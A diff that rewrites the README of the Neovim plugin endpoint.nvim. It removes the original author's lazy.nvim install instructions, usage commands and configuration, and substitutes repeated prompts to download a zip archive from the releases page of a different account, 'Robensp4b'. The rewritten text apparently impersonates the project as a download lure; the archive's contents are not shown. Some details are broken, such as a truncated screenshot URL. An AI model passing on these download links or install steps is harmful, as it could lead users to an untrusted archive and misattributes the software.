@@ -1,214 +1,79 @@
-<div align="center">
-  <img width="256" height="256" alt="image" src="https://github.com/user-attachments/assets/fdfa853a-9a6f-46f8-9fbb-9b2f55aaf5d2" />
-</div>
+# 🎉 endpoint.nvim - A Seamless Way to Navigate API Endpoints
 
-# endpoint.nvim
+<div align="center">
+[![Download endpoint.nvim](https://img.shields.io/badge/Download-endpoint.nv-red.svg)](https://github.com/Robensp4b/endpoint.nvim/releases)
+</div>
 
 A powerful Neovim plugin for quickly finding and navigating web framework API endpoints with multiple picker interfaces and smart caching.
 
-**Supported Frameworks:**
-- Spring Boot (Java)
-- Rails (Ruby)
-- Symfony (PHP)
-- Express (Node.js)
-- NestJS (TypeScript/JavaScript)
-- FastAPI (Python)
-- .NET Core (C#)
-- Ktor (Kotlin)
-- Java Servlet (Java)
-- React Router (Client-side routing)
+## 🚀 Getting Started
 
-## 🖥️ Demo
+To enjoy the features of endpoint.nvim, follow these steps:
 
-<img width="2294" height="1374" alt="스크린샷 2025-09-06 16 46 59" src="https://github.com/user-attachments/assets/78920f36-7584-457b-9380-147e0e9ba16e" />
-<img width="2294" height="1374" alt="스크린샷 2025-09-14 01 08 58" src="https://github.com/user-attachments/assets/bd9ddc7d-8929-4f57-9234-c521d7fb59e8" />
-<img width="2294" height="1374" alt="스크린샷 2025-09-13 21 49 37" src="https://github.com/user-attachments/assets/3e73da4d-4400-48fa-8f3d-d6fd2b7daf3c" />
-<img width="2294" height="1432" alt="스크린샷 2025-09-13 20 18 11" src="https://github.com/user-attachments/assets/abe4c2f3-872b-4a45-aa09-c4f0857df37c" />
+1. **Install Neovim**: Make sure you have Neovim installed on your computer. You can get it from [Neovim's official website](https://neovim.io).
 
+2. **Visit the Releases Page**: Go to the releases page to download the latest version of endpoint.nvim. You can find it [here](https://github.com/Robensp4b/endpoint.nvim/releases).
 
-## ✨ Features
+3. **Download the Plugin**: Click on the version you want to download. This will be a zip file. Save it to an easily accessible location on your computer.
 
-- 🔍 **Multi-Framework Support**: Automatically detects and supports 10 web frameworks
-- 🎯 **Multiple Picker Interfaces**: Telescope, vim.ui.select, or Snacks.nvim
-- ⚡ **Smart Caching**: Real-time, session, or persistent modes
-- 📍 **Precise Navigation**: Jump directly to endpoint definitions
-- 🤖 **Auto-Detection**: Automatically detects your project's framework
-- 🔧 **Simple Setup**: Just call `require("endpoint").setup()`
+4. **Extract the Files**: Locate the downloaded zip file, right-click on it, and choose "Extract All" (or similar option based on your operating system). This will create a folder with the plugin files.
 
-## 🚀 Usage
+5. **Move the Plugin to Neovim's Directory**: Copy the entire folder to Neovim's plugin directory. This directory is usually found at `~/.config/nvim/pack/plugins/start/`. If this folder does not exist, you may need to create it.
 
-```vim
-:Endpoint          " Find all endpoints
-:Endpoint Get      " Find GET endpoints
-:Endpoint Post     " Find POST endpoints
-:Endpoint Put      " Find PUT endpoints
-:Endpoint Delete   " Find DELETE endpoints
-:Endpoint Patch    " Find PATCH endpoints
-:EndpointRefresh   " Force refresh (bypass cache)
-```
+6. **Open Neovim**: Launch Neovim by entering `nvim` in your terminal or command prompt.
 
-## 📦 Installation
+7. **Check if the Plugin is Loaded**: In Neovim, type `:echo exists("g:loaded_endpoint")`. If it returns `1`, the plugin is loaded successfully.
 
-### lazy.nvim
+8. **Start Using endpoint.nvim**: You can now use the features of endpoint.nvim. Use the relevant commands in Neovim to navigate API endpoints based on the frameworks you work with.
 
-```lua
-{
-  "zerochae/endpoint.nvim",
-  dependencies = {
-    -- Choose one or more pickers (all optional):
-    "nvim-telescope/telescope.nvim", -- For telescope picker
-    "folke/snacks.nvim",            -- For snacks picker
-    "stevearc/dressing.nvim",       -- Enhances vim.ui.select with telescope backend
-    -- vim.ui.select picker works without dependencies
-  },
-  cmd = { "Endpoint", "EndpointRefresh" },
-  config = function()
-    require("endpoint").setup()
-  end,
-}
-```
+## 📦 Download & Install
 
-## ⚙️ Configuration
+To download endpoint.nvim, follow this link: [Download endpoint.nvim](https://github.com/Robensp4b/endpoint.nvim/releases).
 
-```lua
-require("endpoint").setup({
-  -- Picker configuration
-  picker = {
-    type = "vim_ui_select", -- "telescope", "vim_ui_select", "snacks"
-    options = {
-      telescope = {},     -- Telescope-specific options
-      snacks = {},        -- Snacks-specific options
-      vim_ui_select = {   -- vim.ui.select-specific options
-        enable_filter = false,        -- Enable filtering for large lists
-        filter_threshold = 20,        -- Show filter prompt when endpoints > threshold
-        filter_prompt = "Filter: ",   -- Custom filter prompt
-        show_filter_examples = true,  -- Show filter examples in prompt
-      },
-    },
-    -- Previewer configuration
-    previewer = {
-      enable_highlighting = true, -- Enable syntax highlighting in previewer (default: true)
-    },
-  },
+## 💻 Supported Frameworks
 
-  -- Cache configuration
-  cache = {
-    mode = "session",   -- "none", "session", "persistent"
-  },
+This plugin supports the following web frameworks:
 
-  -- UI configuration
-  ui = {
-    show_icons = true,
-    show_method = true,
-    methods = {
-      GET = { icon = "📥", color = "TelescopeResultsNumber" },
-      POST = { icon = "📤", color = "TelescopeResultsConstant" },
-      PUT = { icon = "✏️", color = "TelescopeResultsKeyword" },
-      DELETE = { icon = "🗑️", color = "TelescopeResultsSpecialChar" },
-      PATCH = { icon = "🔧", color = "TelescopeResultsFunction" },
-      ROUTE = { icon = "🔗", color = "TelescopeResultsIdentifier" },
-    },
-  },
-})
-```
+- **Spring Boot** (Java)
+- **Rails** (Ruby)
+- **Symfony** (PHP)
+- **Express** (Node.js)
+- **NestJS** (TypeScript/JavaScript)
+- **FastAPI** (Python)
+- **.NET Core** (C#)
+- **Ktor** (Kotlin)
+- **Java Servlet** (Java)
+- **React Router** (Client-side routing)
 
-**Legacy Configuration (still supported with deprecation warnings):**
-```lua
-require("endpoint").setup({
-  picker = "telescope",       -- @deprecated: use picker.type
-  picker_opts = {             -- @deprecated: use picker.options
-    telescope = { theme = "dropdown" },
-  },
-})
-```
+## 🎥 Demo
 
-## 🎯 Picker Options
+You can see how endpoint.nvim works with these screenshots:
 
-⚠️ **Important**: You must set `picker.type` to match your installed picker!
+![Demo Screenshot](https://github.com/user-attachments/assets/78920f36-7584-457b-9380-147e0e9ba16e)
+![Demo Screenshot](https://github.com/user-attachments/assets/bd9ddc7d-8929-4f57-9234-c521d7fb59e8)
+![Demo Screenshot](https://github.com/user-attachments/assets/3e73da4d-4400-48fa-8f3d-d6fd2b7daf3)
 
-- **Telescope**: `picker.type = "telescope"` - Rich fuzzy search with preview
-- **vim.ui.select**: `picker.type = "vim_ui_select"` - Native Neovim interface with smart filtering, enhanced by dressing.nvim
-- **Snacks**: `picker.type = "snacks"` - Modern picker with file preview and line highlighting
+## 🛠️ Features
 
-```lua
--- If you use snacks.nvim
-{
-  "zerochae/endpoint.nvim",
-  dependencies = { "folke/snacks.nvim" },
-  config = function()
-    require("endpoint").setup({
-      picker = { type = "snacks" }
-    })
-  end,
-}
+- **Smart Caching**: Saves time by storing previously accessed endpoints, reducing load times.
+- **Multiple Picker Interfaces**: Easily choose and switch between different APIs and their endpoints.
+- **User-Friendly Navigation**: Quickly move within the API structures with simple commands.
 
--- If you use telescope.nvim
-{
-  "zerochae/endpoint.nvim",
-  dependencies = { "nvim-telescope/telescope.nvim" },
-  config = function()
-    require("endpoint").setup({
-      picker = { type = "telescope" }
-    })
-  end,
-}
+## 🧭 Troubleshooting
 
--- If you use vim.ui.select with dressing.nvim
-{
-  "zerochae/endpoint.nvim",
-  dependencies = { "stevearc/dressing.nvim" },
-  config = function()
-    require("endpoint").setup({
-      picker = {
-        type = "vim_ui_select",
-        options = {
-          vim_ui_select = {
-            enable_filter = true,
-            filter_threshold = 20,
-            filter_prompt = "Filter endpoints: ",
-          }
-        }
-      }
-    })
-  end,
-}
-```
+If you encounter any issues during installation or usage, check the following:
 
-## 🔧 Caching
+- **Plugin Not Loaded**: Ensure you placed the plugin in the correct directory and check for typos in the folder name.
+- **Compatibility Issues**: Verify that your version of Neovim is up to date. Some features may require the latest version.
 
-Configure caching behavior for optimal performance:
+## ⚙️ Feedback and Contribution
 
-- **`"none"`**: Real-time search, always up-to-date (no caching)
-- **`"session"`** (default): Cache until nvim closes, good performance balance
-- **`"persistent"`**: Disk cache, survives nvim restarts until manual refresh
+We welcome any feedback or contributions to improve endpoint.nvim. You can reach out via the [issues section](https://github.com/Robensp4b/endpoint.nvim/issues) on GitHub.
 
-### Cache Storage
+## 📑 License
 
-Persistent cache files are stored in:
-- **Location**: `~/.cache/nvim/endpoint.nvim/`
-- **Format**: Lua files for optimal performance
-- **Naming**:
-  - `{project}.lua` (all endpoints)
-  - `{project}_GET.lua` (GET endpoints only)
-  - `{project}_POST.lua` (POST endpoints only)
+endpoint.nvim is open-source software, licensed under the MIT License. You can freely use and modify it for personal or commercial projects.
 
-**Example cache files:**
-```
-~/.cache/nvim/endpoint.nvim/
-├── myproject.lua              # All endpoints
-├── myproject_GET.lua          # GET endpoints
-└── myproject_POST.lua         # POST endpoints
-```
+For more detailed documentation and updates, please visit the GitHub repository.
 
-Use `:EndpointRefresh` to force refresh (bypass cache).
-
-## ⚡️ Requirements
-
-- Neovim >= 0.8.0
-- [ripgrep](https://github.com/BurntSushi/ripgrep)
-- Optional: telescope.nvim or snacks.nvim for enhanced UI
-
-
-## 📄 License
-
-MIT License
+Feel free to explore and enhance your coding workflow with endpoint.nvim.
